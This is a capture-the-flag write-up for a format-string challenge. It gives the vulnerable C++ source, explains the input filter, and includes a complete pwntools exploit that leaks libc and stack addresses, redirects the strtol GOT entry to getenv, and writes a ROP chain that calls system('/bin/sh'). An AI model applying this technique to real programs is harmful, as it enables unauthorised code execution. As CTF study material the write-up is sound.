We have the binary, source and libc. Source:

```cpp
#include <cstdio>
#include <stdlib.h>


bool check(char* s) {
    char tmp[384] = {0};
    int i = 0, j = 0, cnt = 0;     
    bool run = false;

    for (; i < 384; i++) {
        j = 0;
        if (s[i] != '%') continue;       

        cnt += 1;                          
        i += 1; 
        if (s[i] == '0') {         // 
            // don't waste space!!
            return false;
        }

        while (s[i] >= '0' && s[i] <= '9') {      
            tmp[j] = s[i];                         
            i += 1;                                 
            j += 1;     
        }

        if (j <= 1) {                              
            return false; 
        }

        tmp[j] = 0;                                 
        int fmt_val = strtol(tmp, (char**)(&tmp), 10);    
        if (fmt_val >= 58) {                                
            return false;
        }

    }
    return true;
}

int main(int argc, char** argv, char** envp) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    char s[384] = {0,};
    while(1) {
        printf(">> ");
        fgets(s, 384, stdin);
        if (check(s)) printf(s);
        else break;
    }
    return 0;
}

// gcc chall.cpp -o chall -O0 -Wno-format-security -Wl,-z,relro,-z,lazy -no-pie
```

There is a FormatString bug here 

![image](https://hackmd.io/_uploads/H17KDShmye.png)

But before that, our input must go through a filter `check()`. 
- Maximum of our payload is 384. 
- If there is no `%` in our string, it returns true
- Else, it starting saving any number after `%` to `tmp` array. And if it starts with any character, not in range [0, 9], it will return false. And our string after `%` must not start with 0. And if the number in `tmp` greater than 58, it returns false. 
Summary: Our input must contain `%{n}...` which n in range [10, 57]. 

So first, let's leak the base address of libc. 

![image](https://hackmd.io/_uploads/HyOPKr37yx.png)

After leaking libc, we need somehow bypass the check so we can overwrite the `ret` address of main. But we don't need the value in `ret` address because it just the address of libc. We need to leak stack so we can overwrite it to our ROPchain

![image](https://hackmd.io/_uploads/SJ0coH2m1g.png)

This address is a address of stack : `0x00007fffffffe498`. Find it offset: 

![image](https://hackmd.io/_uploads/S1qCkLnmkl.png)

But in the program, i use `66` but it return (nil), so i change to `65` and it works. I dont know why? 
But now we must bypass the `check()` so we can leak the value in `%65$p`. We can overwrite the `strtol` GOT to `getenv`, so when it calls `strtol`, it will return null, then we can bypass the `fmt_val >= 58`. We also need some padding to write exactly where we want. 

Script: 
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    input()
    # Leak libc address
    r.sendlineafter(b'>> ',b'%11$s\0\0\0' + p64(0x404030))
    libc_leak = u64(r.recv(6) + b'\0\0')
    info('Libc leak: ' + hex(libc_leak))
    libc.address = libc_leak - libc.sym['strtol']
    info('Libc address: ' + hex(libc.address))
    pause()
    def padding(string, l):
        while len(string) < l:
            string += b'A'
        return string
    def overwrite(start_addr, value):
        arr = []
        for i in range(8):
            arr.append((start_addr + i, value & 0xff))
            value >>= 8
        arr = sorted(arr, key=lambda x:x[1])
        info('Array of overwriting value and address: ')
        print(arr)
        payload = b''
        count = 0
        index = 49
        for adrr,val in arr:
            payload += b'A'*(val - count) + f'%{index}$hhn'.encode()
            count = val
            index += 1
        payload = padding(payload, 312)
        for addr, _ in arr: 
            payload += p64(addr)
        r.sendlineafter(b'>> ', payload)

    getenv = libc.sym['getenv']
    system = libc.sym['system']
    binsh = next(libc.search('/bin/sh\0'))
    poprdi = libc.address + 0x000000000002a3e5
    ret = poprdi + 1
    strtol_got = exe.got['strtol']
    info('Getenv address: ' + hex(getenv))
    info('System address: ' + hex(system))
    info('/bin/sh address: ' + hex(binsh))
    info('Ret address: ' + hex(ret))
    info('strtol got: ' + hex(strtol_got))

    overwrite(strtol_got, getenv)
    r.sendlineafter(b'>> ', b'%65$p')
    stack_leak = int(r.recv(14),16)
    info('Stack leak: ' + hex(stack_leak))
    rop_start_addr = stack_leak - 0x110
    info('rop start address: ' + hex(rop_start_addr))
    pause()
    overwrite(rop_start_addr, poprdi)
    overwrite(rop_start_addr + 8, binsh)
    overwrite(rop_start_addr + 16, ret)
    overwrite(rop_start_addr + 24, system)

    overwrite(exe.got['strtol'], libc.sym['strtol'])
    r.sendlineafter(b'>> ', b'%58$p')
    pause()
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()

```
Sometimes the script doesn't work, but sometime it will pop the shell

![image](https://hackmd.io/_uploads/BJJWWLnQyx.png)

![image](https://hackmd.io/_uploads/HJKZWLnQyl.png)
